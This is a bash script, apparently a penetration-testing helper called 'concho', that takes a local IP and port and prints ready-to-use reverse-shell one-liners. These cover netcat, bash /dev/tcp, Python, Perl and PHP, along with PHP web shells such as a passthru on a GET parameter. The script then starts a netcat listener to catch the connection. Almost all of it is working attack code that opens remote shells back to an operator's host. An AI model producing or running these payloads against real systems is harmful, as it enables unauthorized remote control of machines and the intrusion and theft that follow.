#!/bin/bash

#Conchology:
#The scientific study or collection of mollusc shells.

# $1 ip of local machine
# $2 listening port

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Display error if not enough arguments given
if [ $# -ne 2 ]; then
	printf " ${RED}Usage: ${NC} ./concho.sh local_ip listening_port \n"
	exit 1
fi

printf "${YELLOW}Note that all shells are unencrypted, and may be vulnerable to interception.\n\n\n${NC}"

concho_ports_in_use=$(netstat -tln | tail -n +3 | awk '{ print $4 }' | rev | cut -d ':' -f 1 | rev | sort -u)

for i in $concho_ports_in_use;
do
	if [[ "$i" == "$2" ]]; then
		printf "${RED}Port unavailable.\n${NC}\n"
		exit 1
	fi
done
unset concho_ports_in_use

conchofilename=$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -$((RANDOM%7+3)) | head -1)

# Netcat shells
printf ".. Netcat without '-e' ..\n.-------------------------------.\n"
printf "rm /tmp/$conchofilename; mkfifo /tmp/$conchofilename; cat /tmp/$conchofilename|/bin/sh -i 2>&1|nc $1 $2 > /tmp/$conchofilename\n"
printf ".-------------------------------.\n\n"

printf ".. Netcat with '-e' RevShell ..\n.-------------------------------.\n"
printf "nc $1 $2 -e /bin/sh\nnc $1 $2 -e cmd.exe\n"
printf ".-------------------------------.\n\n"

#Command Line Shells
printf ".. Pure Bash RevShell ..\n.-------------------------------.\n"
printf "bash -i >& /dev/tcp/$1/$2 0>&1\n"
printf ".-------------------------------.\n\n"

printf ".. Python RevShells ..\n.-------------------------------.\n"
printf "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'\n\n"

printf "python -c 'import os;os.system(\"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 > /tmp/f\")'\n"
printf ".-------------------------------.\n\n"

printf ".. Perl RevShells ..\n.-------------------------------.\n"
printf "Windows-Friendly\nperl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"$1:$2\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;\'\n\n"
printf "perl -e \'use Socket;\$i=\"$1\";\$p=$2;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'\n\n"
printf "Doesn't rely on /bin/sh\nperl -MIO -e \'\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$1:$2\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;\'\n"

printf ".-------------------------------.\n\n"

printf ".. PHP CLI RevShell ..\n.-------------------------------.\n"
printf "php -r '\$sock=fsockopen(\"$1\",\"$2\");exec(\"/bin/sh -i <&3 >&3 2>&3\");\'\n"
printf ".-------------------------------.\n\n"

#PHP Shell Payloads
printf ".. PHP WebPage Microshell ..\n.-------------------------------.\n"
printf "<?php passthru(\$_GET[\"cmd\"]); ?>\n"
printf ".-------------------------------.\n\n"

printf ".. PHP VisitMe Shell ..\n.-------------------------------.\n"
printf "<?php passthru(\"${YELLOW}ENTER COMMANDS${NC}\"]); ?>\n"
printf "<?php passthru(\"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 > /tmp/f\"); ?>\n"
printf ".-------------------------------.\n\n\n"



printf "${GREEN}Starting simple listener with \'nc -lnvp $2\'\n${NC}"



nc -lnvp $2
